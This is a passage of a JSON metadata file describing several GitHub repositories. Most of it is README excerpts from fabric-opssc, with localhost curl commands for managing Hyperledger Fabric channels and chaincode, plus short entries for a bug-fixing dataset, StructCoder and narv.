                    "value": "To create a new channel (named `mychannel`) based on the \"SampleConsortium\" consortium, an administrator for `Org1MSP` sends a request for the channel update proposal to the OpsSC API server first.\nIn the sample environment, the API server for Org1MSP serves on port 5000. \nThe request is:\n```sh\n$ curl -X POST http://localhost:5000/api/v1/channel/proposals/create_mychannel \\\n-H \"Expect:\" \\\n-H 'Content-Type: application/json; charset=utf-8' \\\n-d @- <<EOF\n{\n  \"proposal\": {\n    \"channelID\": \"mychannel\",\n    \"description\": \"Create mychannel\",\n    \"action\": \"create\",\n    \"opsProfile\": {\n      \"Consortium\": \"SampleConsortium\",\n      \"Application\": {\n        \"Capabilities\": [\n          \"V2_0\"\n        ],\n        \"Policies\": {\n          \"Readers\": {\n            \"Type\": \"ImplicitMeta\",\n            \"Rule\": \"ANY Readers\"\n          },\n          \"Writers\": {\n            \"Type\": \"ImplicitMeta\",\n            \"Rule\": \"ANY Writers\"\n          },\n          \"Admins\": {\n            \"Type\": \"ImplicitMeta\",\n            \"Rule\": \"ANY Admins\"\n          },\n          \"LifecycleEndorsement\": {\n            \"Type\": \"ImplicitMeta\",\n            \"Rule\": \"MAJORITY Endorsement\"\n          },\n          \"Endorsement\": {\n            \"Type\": \"ImplicitMeta\",\n            \"Rule\": \"MAJORITY Endorsement\"\n          }\n        },\n        \"Organizations\": [\n          \"Org1MSP\",\n          \"Org2MSP\"\n        ]\n      }\n    }\n  }\n}\nEOF\n\"create_mychannel\" # 200 OK with the proposal ID\n```\n \nThe command to get the proposal with the ID is the following:\n```sh\n$ curl -X GET http://localhost:5001/api/v1/channel/proposals/create_mychannel | jq\n{\n  \"docType\": \"proposal\",\n  \"ID\": \"create_mychannel\",\n  \"channelID\": \"mychannel\",\n  \"description\": \"Create mychannel\",\n  \"creator\": \"Org1MSP\",\n  \"status\": \"proposed\",\n  \"opsProfile\": {\n    \"Application\": {\n      \"Capabilities\": [\n        \"V2_0\"\n      ],\n      \"Organizations\": [\n        \"Org1MSP\",\n        \"Org2MSP\"\n      ],\n(...)\n```\nThe command to vote for the proposal is:\n```sh\n$ curl -X POST http://localhost:5001/api/v1/channel/proposals/create_mychannel/vote\n\"\" # 200 OK\n```\n \nWhen creating a channel, it will be passed if a majority of the votes for the proposal are collected by the organizations participating in the _system_ channel. \nBy using the following command, wait for the status of the proposal to be committed:\n```sh\n$ curl -X GET http://localhost:5001/api/v1/channel/proposals/create_mychannel | jq\n{\n  \"docType\": \"proposal\",\n  \"ID\": \"create_mychannel\",\n  \"channelID\": \"mychannel\",\n  \"description\": \"Create mychannel\",\n  \"creator\": \"Org1MSP\",\n  \"status\": \"committed\", # Updated the status to committed\n(...)\n```\nBy using the following command, you can confirm the channel information:\n```sh\n$ curl -X GET http://localhost:5001/api/v1/channel/getChannels | jq\n[\n  {\n    \"docType\": \"channel\",\n    \"ID\": \"mychannel\",\n    \"channelType\": \"application\",\n    \"organizations\": {\n      \"Org1MSP\": \"\",\n      \"Org2MSP\": \"\"\n    }\n  },\n  (...)\n]\n```\n \n",
                    "original_header": "Create a new channel using the OpsSC"
                },
                "confidence": 0.9891505392976716,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "These commands are:\n```sh\n# Convert the endorsement policy for the chaincode to base64 because the API only accepts base64 encoded endorsement policy.\n$ echo -n /Channel/Application/Endorsement | base64\nL0NoYW5uZWwvQXBwbGljYXRpb24vRW5kb3JzZW1lbnQ=\n\n# Send the request\n$ curl -X POST http://localhost:5000/api/v1/chaincode/proposals/deploy_basic \\\n-H \"Expect:\" \\\n-H 'Content-Type: application/json; charset=utf-8' \\\n-d @- <<EOF\n{\n  \"proposal\": {\n    \"channelID\": \"mychannel\",\n    \"chaincodeName\": \"basic\",\n    \"chaincodePackage\": {\n      \"repository\": \"github.com/hyperledger-labs/fabric-opssc\",\n      \"pathToSourceFiles\": \"sample-environments/fabric-samples/asset-transfer-basic/chaincode-go\",\n      \"commitID\": \"main\",\n      \"type\": \"golang\"\n    },\n    \"chaincodeDefinition\": {\n      \"sequence\": 1,\n      \"initRequired\": false,\n      \"validationParameter\": \"L0NoYW5uZWwvQXBwbGljYXRpb24vRW5kb3JzZW1lbnQ=\"\n    }\n  }\n}\nEOF\n{\"docType\":\"proposal\",\"ID\":\"deploy_basic\",\"creator\":\"Org1MSP\",\"channelID\":\"mychannel\",(...)} # 200 OK with the requested proposal\n```\n \nThe command to get the proposal with the ID is the following:\n```sh\n$ curl -X GET http://localhost:5001/api/v1/chaincode/proposals/deploy_basic\n{\"docType\":\"proposal\",\"ID\":\"deploy_basic\",\"creator\":\"Org1MSP\",\"channelID\":\"mychannel\",\"chaincodeName\":\"basic\", ... ,\"status\":\"proposed\",...}\n```\nThe command to vote for the proposal is:\n```sh\n$ curl -X POST http://localhost:5001/api/v1/chaincode/proposals/deploy_basic/vote\n\"\" # 200 OK\n```\n \nBy using the following command, wait for the status of the proposal to be committed:\n```sh\n$ curl -X GET http://localhost:5001/api/v1/chaincode/proposals/deploy_basic | jq 'select(.status == \"committed\")' # wait for the status to be \"committed\"\n{\n  \"docType\": \"proposal\",\n  \"ID\": \"deploy_basic\",\n  (...)\n  \"status\": \"committed\",\n  (...)\n}\n```\nBy using the following commands, can confirm that the chaincode is deployed:\n```sh\n# Confirm basic is installed on the organization (the following command is for Org2MSP)\n$ curl -X GET 'http://localhost:5001/api/v1/chaincode/getInstalledChaincodes' | jq '.installed_chaincodes[] | select(.label == \"basic_1\")'\n{\n  \"package_id\": \"basic_1:7cb90e2dd24972089aaac0180a5c448f3fa7bb9b5cc990d9dcb66ae414e1c027\",\n  \"label\": \"basic_1\",\n  \"references\": {\n    \"mychannel\": {\n      \"chaincodes\": [\n        {\n          \"name\": \"basic\",\n          \"version\": \"1\"\n        }\n      ]\n    }\n  }\n}\n\n# Confirm basic is committed on mychannel (the following command is for Org2MSP)\n$ curl -X GET 'http://localhost:5001/api/v1/chaincode/queryChaincodeDefinition?channelID=mychannel&chaincodeName=basic' | jq\n{\n  \"sequence\": \"1\",\n  \"version\": \"1\",\n  \"endorsement_plugin\": \"escc\",\n  \"validation_plugin\": \"vscc\",\n  \"validation_parameter\": \"EiAvQ2hhbm5lbC9BcHBsaWNhdGlvbi9FbmRvcnNlbWVudA==\",\n  \"collections\": {},\n  \"approvals\": {\n    \"Org2MSP\": true,\n    \"Org1MSP\": true\n  }\n}\n```\nBy using the following commands, can invoke and query the chaincode as a test:\n```sh\n$ curl -X POST 'http://localhost:5000/api/v1/utils/invokeTransaction' \\\n-H \"Expect:\" \\\n-H 'Content-Type: application/json; charset=utf-8' \\\n-d @- <<EOF\n{\n  \"channelID\": \"mychannel\",\n  \"ccName\": \"basic\",\n  \"func\": \"CreateAsset\",\n  \"args\": [\"asset101\", \"blue\", \"5\", \"Tomoko\", \"300\"]\n}\nEOF\n\"\"\n\n$ curl -X GET 'http://localhost:5000/api/v1/utils/queryTransaction?channelID=mychannel&ccName=basic&func=GetAllAssets&args=[]' | jq\n[\n  {\n    \"ID\": \"asset101\",\n    \"color\": \"blue\",\n    \"size\": 5,\n    \"owner\": \"Tomoko\",\n    \"appraisedValue\": 300\n  }\n]\n```\n \n",
                    "original_header": "Deploy a new chaincode by using the OpsSC"
                },
                "confidence": 0.9999973097674512,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First, keys and certificates for peers and orderers for `Org4MSP` should be prepared.\nHere, execute the following utility script to launch a CA for `Org4MSP` and then issue keys and certificates for peers and orderers for `Org4MSP` using the CA.\n```sh\n# Launch a CA for Org4MSP and then issue keys and certificates for peers and orderers for Org4MSP using the CA\n$ ./create-org4-artifacts-for-test-network.sh\n\n# Convert keys and certificates (PEM files) to JSON and store them as environment variables (for simplifying the following steps)\n$ export ORG4_CA_CERT=$(cat organizations/peerOrganizations/org4.example.com/msp/cacerts/localhost-13054-ca-org4.pem | sed -e ':loop; N; $!b loop; s/\\n/\\\\n/g')\n$ echo \"$ORG4_CA_CERT\"\n\n$ export ORG4_TLS_CA_CERT=$(cat organizations/peerOrganizations/org4.example.com/msp/tlscacerts/ca.crt | sed -e ':loop; N; $!b loop; s/\\n/\\\\n/g')\n$ echo \"$ORG4_TLS_CA_CERT\"\n\n$ export ORG4_ORDERER_SERVER_TLS_CERT=$(cat organizations/peerOrganizations/org4.example.com/orderers/orderer0.org4.example.com/tls/server.crt | sed -e ':loop; N; $!b loop; s/\\n/\\\\n/g')\n$ echo \"$ORG4_ORDERER_SERVER_TLS_CERT\"\n```\n \nNext, an administrator for `Org1MSP` sends a request for the channel update proposal to add `Org4MSP` to system-channel to the OpsSC API server. \nThe request is:\n```sh\n$ curl -X POST http://localhost:5000/api/v1/channel/proposals/add_org4_to_system-channel \\\n-H \"Expect:\" \\\n-H 'Content-Type: application/json; charset=utf-8' \\\n-d @- <<EOF\n{\n  \"proposal\": {\n    \"channelID\": \"system-channel\",\n    \"description\": \"Add org4 to system channel\",\n    \"action\": \"update\",\n    \"opsProfile\": [\n      {\n        \"Command\": \"set-org\",\n        \"Parameters\": {\n          \"OrgType\": \"Consortiums|Orderer\",\n          \"Org\": {\n            \"Name\": \"Org4MSP\",\n            \"ID\": \"Org4MSP\",\n            \"MSP\": {\n              \"RootCerts\": [\n                \"$ORG4_CA_CERT\"\n              ],\n              \"TLSRootCerts\": [\n                \"$ORG4_TLS_CA_CERT\"\n              ],\n              \"NodeOUs\": {\n                \"Enable\": true,\n                \"ClientOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"client\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"PeerOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"peer\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"AdminOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"admin\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"OrdererOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"orderer\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                }\n              }\n            },\n            \"Policies\": {\n              \"Readers\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.peer', 'Org4MSP.client')\"\n              },\n              \"Writers\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.client')\"\n              },\n              \"OrderingReaders\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.orderer')\"\n              },\n              \"OrderingWriters\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.orderer')\"\n              },\n              \"Admins\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin')\"\n              },\n              \"Endorsement\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.peer')\"\n              }\n            },\n            \"AnchorPeers\": [\n              {\n                \"Host\": \"peer0.org4.example.com\",\n                \"Port\": 13051\n              }\n            ],\n            \"OrdererEndpoints\": [\n              \"orderer0.org4.example.com:13050\"\n            ]\n          }\n        }\n      },\n      {\n        \"Command\": \"set-consenter\",\n        \"Parameters\": {\n          \"Consenter\": {\n            \"Host\": \"orderer0.org4.example.com\",\n            \"Port\": 13050,\n            \"ClientTLSCert\": \"$ORG4_ORDERER_SERVER_TLS_CERT\",\n            \"ServerTLSCert\": \"$ORG4_ORDERER_SERVER_TLS_CERT\"\n          }\n        }\n      }\n    ]\n  }\n}\nEOF\n\"add_org4_to_system-channel\" # 200 OK with the proposal ID\n```\nThen, an administrator for `Org2MSP` votes for the proposal via the API server:\n```sh\n$ curl -X POST http://localhost:5001/api/v1/channel/proposals/add_org4_to_system-channel/vote\n\"\"\n```\nDo the same for the remaining channels (ops-channel and mychannel):\n```sh\n$ curl -X POST http://localhost:5000/api/v1/channel/proposals/add_org4_to_ops-channel \\\n-H \"Expect:\" \\\n-H 'Content-Type: application/json; charset=utf-8' \\\n-d @- <<EOF\n{\n  \"proposal\": {\n    \"channelID\": \"ops-channel\",\n    \"description\": \"Add org4 to ops-channel\",\n    \"action\": \"update\",\n    \"opsProfile\": [\n      {\n        \"Command\": \"set-org\",\n        \"Parameters\": {\n          \"OrgType\": \"Application|Orderer\",\n          \"Org\": {\n            \"Name\": \"Org4MSP\",\n            \"ID\": \"Org4MSP\",\n            \"MSP\": {\n              \"RootCerts\": [\n                \"$ORG4_CA_CERT\"\n              ],\n              \"TLSRootCerts\": [\n                \"$ORG4_TLS_CA_CERT\"\n              ],\n              \"NodeOUs\": {\n                \"Enable\": true,\n                \"ClientOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"client\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"PeerOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"peer\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"AdminOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"admin\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"OrdererOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"orderer\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                }\n              }\n            },\n            \"Policies\": {\n              \"Readers\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.peer', 'Org4MSP.client')\"\n              },\n              \"Writers\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.client')\"\n              },\n              \"OrderingReaders\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.orderer')\"\n              },\n              \"OrderingWriters\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.orderer')\"\n              },\n              \"Admins\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin')\"\n              },\n              \"Endorsement\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.peer')\"\n              }\n            },\n            \"AnchorPeers\": [\n              {\n                \"Host\": \"peer0.org4.example.com\",\n                \"Port\": 13051\n              }\n            ],\n            \"OrdererEndpoints\": [\n              \"orderer0.org4.example.com:13050\"\n            ]\n          }\n        }\n      },\n      {\n        \"Command\": \"set-consenter\",\n        \"Parameters\": {\n          \"Consenter\": {\n            \"Host\": \"orderer0.org4.example.com\",\n            \"Port\": 13050,\n            \"ClientTLSCert\": \"$ORG4_ORDERER_SERVER_TLS_CERT\",\n            \"ServerTLSCert\": \"$ORG4_ORDERER_SERVER_TLS_CERT\"\n          }\n        }\n      }\n    ]\n  }\n}\nEOF\n\"add_org4_to_ops-channel\" # 200 OK with the proposal ID\n```\n \n```sh\n$ curl -X POST http://localhost:5001/api/v1/channel/proposals/add_org4_to_ops-channel/vote\n\"\"\n```\n```sh\n$ curl -X POST http://localhost:5000/api/v1/channel/proposals/add_org4_to_mychannel \\\n-H \"Expect:\" \\\n-H 'Content-Type: application/json; charset=utf-8' \\\n-d @- <<EOF\n{\n  \"proposal\": {\n    \"channelID\": \"mychannel\",\n    \"description\": \"Add org4 to mychannel\",\n    \"action\": \"update\",\n    \"opsProfile\": [\n      {\n        \"Command\": \"set-org\",\n        \"Parameters\": {\n          \"OrgType\": \"Application|Orderer\",\n          \"Org\": {\n            \"Name\": \"Org4MSP\",\n            \"ID\": \"Org4MSP\",\n            \"MSP\": {\n              \"RootCerts\": [\n                \"$ORG4_CA_CERT\"\n              ],\n              \"TLSRootCerts\": [\n                \"$ORG4_TLS_CA_CERT\"\n              ],\n              \"NodeOUs\": {\n                \"Enable\": true,\n                \"ClientOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"client\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"PeerOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"peer\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"AdminOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"admin\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                },\n                \"OrdererOUIdentifier\": {\n                  \"OrganizationalUnitIdentifier\": \"orderer\",\n                  \"Certificate\": \"$ORG4_CA_CERT\"\n                }\n              }\n            },\n            \"Policies\": {\n              \"Readers\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.peer', 'Org4MSP.client')\"\n              },\n              \"Writers\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.client')\"\n              },\n              \"OrderingReaders\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.orderer')\"\n              },\n              \"OrderingWriters\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin', 'Org4MSP.orderer')\"\n              },\n              \"Admins\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.admin')\"\n              },\n              \"Endorsement\": {\n                \"Type\": \"Signature\",\n                \"Rule\": \"OR('Org4MSP.peer')\"\n              }\n            },\n            \"AnchorPeers\": [\n              {\n                \"Host\": \"peer0.org4.example.com\",\n                \"Port\": 13051\n              }\n            ],\n            \"OrdererEndpoints\": [\n              \"orderer0.org4.example.com:13050\"\n            ]\n          }\n        }\n      },\n      {\n        \"Command\": \"set-consenter\",\n        \"Parameters\": {\n          \"Consenter\": {\n            \"Host\": \"orderer0.org4.example.com\",\n            \"Port\": 13050,\n            \"ClientTLSCert\": \"$ORG4_ORDERER_SERVER_TLS_CERT\",\n            \"ServerTLSCert\": \"$ORG4_ORDERER_SERVER_TLS_CERT\"\n          }\n        }\n      }\n    ]\n  }\n}\nEOF\n\"add_org4_to_mychannel\" # 200 OK with the proposal ID\n```\n```sh\n$ curl -X POST http://localhost:5001/api/v1/channel/proposals/add_org4_to_mychannel/vote\n\"\"\n```\n \nBy using the following command, you can see that `Org4MSP` is added to each channel:\n```sh\n$ curl -X GET http://localhost:5001/api/v1/channel/getChannels | jq\n[\n  {\n    \"docType\": \"channel\",\n    \"ID\": \"mychannel\",\n    \"channelType\": \"application\",\n    \"organizations\": {\n      \"Org1MSP\": \"\",\n      \"Org2MSP\": \"\",\n      \"Org4MSP\": \"\" # Added\n    }\n  },\n  (...)\n]\n```\nNext, execute the following utility script to launch the peer, the ordering node, the OpsSC agent and the API server for `Org4MSP`:\n```sh\n# Launch the peer, the ordering node, the OpsSC agent and the API server for Org4MSP\n$ ./launch-org4-nodes-for-test-network.sh\n```\n \nBy running the following commands, you can confirm whether the agent and API server for `Org4MSP` get ready:\n```sh\n## Check for the API server for Org4MSP\n$ curl -X GET http://localhost:5003/healthz\nOK\n## Check for the agent for Or4MSP (NOTE: Take about 2-3 minutes to be \"OK\")\n$ curl -X GET http://localhost:5503/healthz\nOK\n```\nBy running the following commands, you can confirm that the nodes for `Org4MSP` get ready and\ndeployed `basic` chaincode which were deployed the previous operations.\n```sh\n$ export PATH=${PWD}/../bin:$PATH\n$ export FABRIC_CFG_PATH=$PWD/../config/\n\n$ export CORE_PEER_TLS_ENABLED=true\n$ export CORE_PEER_LOCALMSPID=\"Org4MSP\"\n$ export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org4.example.com/peers/peer0.org4.example.com/tls/ca.crt\n$ export CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n$ export CORE_PEER_ADDRESS=localhost:13051\n\n$ peer chaincode query -C mychannel -n basic -c '{\"Args\":[\"GetAllAssets\"]}'\n```\n \n",
                    "original_header": "Add a new organization to each channel using the OpsSC"
                },
                "confidence": 0.9999001968053379,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can tear down the sample environment by using the following command.\n```sh\n$ cd ${FABRIC_OPSSC}/integration\n$ ./teardownDockerEnv.sh\n```\n \nIf any of the above steps fail in the middle, reset the environment with this command and try again.\n \n",
                    "original_header": "(Optional.) Tear down the test network"
                },
                "confidence": 0.9988149428271103,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- The conditions for passing a proposal are assumed to be voted by a majority of the members of the target channel\n- Does not yet support deploying Java chaincode\n- Does not yet support using Channel participating API from v2.3.0\n \n",
                    "original_header": "Limitations"
                },
                "confidence": 0.9446152653240507,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Add a voting config option for chaincode-ops - ([Detail](./docs/VotingConfigOption.md))\n  - This allows OpsSC users to configure the maximum number of malicious organizations (`f`) in the voting process\n  - This config option is not yet supported for channel-ops\n- Add a function to update channel type and introduce `disable` channel type to channel-ops\n- Support both Hyperledger Fabric v2.4 and v2.2 series (Out of scope: v2.3)\n- Other minor improvements\n \n",
                    "original_header": "v0.3.0 (Oct. 27, 2022)"
                },
                "confidence": 0.9999867319600916,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- The initial version of Operations Smart Contract (OpsSC) for Hyperledger Fabric v2.x\n  - Support chaincode operations (chaincode-ops): Streamline chaincode deployment with chaincode new lifecycle introduced from v2.x.\n  - Support channel operations (channel-ops): Streamline channel configuration updates across multiple organizations (e.g., creating a channel, adding an organization, adding an orderer etc.)\n \n",
                    "original_header": "v0.1.0 (Jan. 9, 2021)"
                },
                "confidence": 0.9971267528052693,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-07T19:33:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-25T10:51:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 381609
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 256244
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 116125
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 43376
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Gherkin",
                    "name": "Gherkin",
                    "type": "Programming_language",
                    "size": 40411
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 26422
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 4793
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Smarty",
                    "name": "Smarty",
                    "type": "Programming_language",
                    "size": 3694
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2990
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "833": {
        "filename": "panthap2_developer-discussions-for-bug-fixing_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/panthap2/developer-discussions-for-bug-fixing",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "**Dataset for our Findings of EMNLP 2022 paper \"Using Developer Discussions to Guide Fixing Bugs in Software\"**\n\nThe *Discussion-Augmented BFP* datasets can be found [here](https://drive.google.com/drive/folders/1raydTeLxsW07KOER_HodOblFFesbMLQC?usp=sharing).\n\nTo compile these datasets, we augmentrf the [BFP](https://arxiv.org/pdf/1812.08693.pdf) datasets with bug report discussions from GitHub Issues. We relied on the preprocessed version of this BFP data released in [MODIT](https://github.com/modit-team/MODIT).\n\nIf you find this work useful, please consider citing our paper:\n\n```\n@inproceedings{PanthaplackelETAL22UsingDeveloperDiscussions,\n  author = {Panthaplackel, Sheena and Gligoric, Milos and Li, Junyi Jessy and Mooney, Raymond J.},\n  title = {Using Developer Discussions to Guide Fixing Bugs in Software},\n  booktitle = {Findings of EMNLP},\n  pages = {To Appear},\n  year = {2022},\n}\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Using Developer Discussions to Guide Fixing Bugs in Software"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/panthap2/developer-discussions-for-bug-fixing/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-15T21:49:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-14T01:52:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "834": {
        "filename": "reddy-lab-code-research_StructCoder_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/reddy-lab-code-research/StructCoder",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "    conda create -n structcoder --file structcoder.yml\n    conda activate structcoder\nFor running preprocessing notebooks, add the created structcoder conda enviroment to jupyter notebook using the following commands.\n\n    conda install -c anaconda ipykernel\n    python3 -m ipykernel install --user --name=structcoder\n",
                    "type": "Text_excerpt",
                    "original_header": "Setting up conda environment",
                    "parent_header": [
                        "StructCoder"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/reddy-lab-code-research/StructCoder/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the cells in pretrain_preprocess.ipynb and finetune_preprocess.ipynb. This should create a folder data/ with subfolders for each dataset used for experiments. You can skip pretrain_preprocess.ipynb if you choose to run our finetuning codes with the provided pretrained checkpoint. \n \n",
                    "original_header": "Data Preprocessing"
                },
                "confidence": 0.9121300669955567,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/reddy-lab-code-research/StructCoder/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-09T15:50:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-15T16:46:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 987461
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 293184
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "835": {
        "filename": "formes20_narv_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/formes20/narv",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-09-17T05:57:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-08T16:12:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 519109
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 296976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 19521
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 1958
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1061
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "QMake",
                    "name": "QMake",
                    "type": "Programming_language",
                    "size": 906
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
